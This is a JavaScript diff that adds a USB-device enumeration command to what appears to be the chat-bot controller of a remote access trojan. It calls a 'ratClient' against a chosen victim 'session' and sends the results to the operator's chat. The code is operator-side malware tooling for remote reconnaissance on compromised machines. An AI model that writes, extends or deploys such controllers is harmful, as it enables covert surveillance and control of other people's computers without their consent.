@@ -222,4 +222,52 @@ export class SystemCommands {
       });
     }
   }
+
+  /**
+   * USB devices enumeration
+   */
+  async usbDevices(chatId, sessionId) {
+    if (!sessionId) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      });
+      return;
+    }
+
+    await this.sock.sendMessage(chatId, { 
+      text: ResponseFormatter.info('💾 Enumerating USB devices...\n\n_Please wait..._') 
+    });
+
+    try {
+      const result = await this.ratClient.enumerateUSB(sessionId);
+      
+      if (result.success) {
+        let response = ResponseFormatter.header('💾', 'USB DEVICES') + '\n\n';
+        const devices = typeof result.data === 'string' ? result.data.split('\n') : result.data;
+        
+        const filtered = (Array.isArray(devices) ? devices : [devices])
+          .filter(d => d && d.trim())
+          .slice(0, 15);
+        
+        if (filtered.length === 0) {
+          response += 'No USB devices found';
+        } else {
+          filtered.forEach((device, idx) => {
+            const devStr = typeof device === 'string' ? device : JSON.stringify(device);
+            response += `${idx + 1}. ${devStr.trim()}\n`;
+          });
+        }
+        
+        await this.sock.sendMessage(chatId, { text: response });
+      } else {
+        await this.sock.sendMessage(chatId, { 
+          text: ResponseFormatter.error(result.error) 
+        });
+      }
+    } catch (error) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error(`USB enumeration failed: ${error.message}`) 
+      });
+    }
+  }
 }
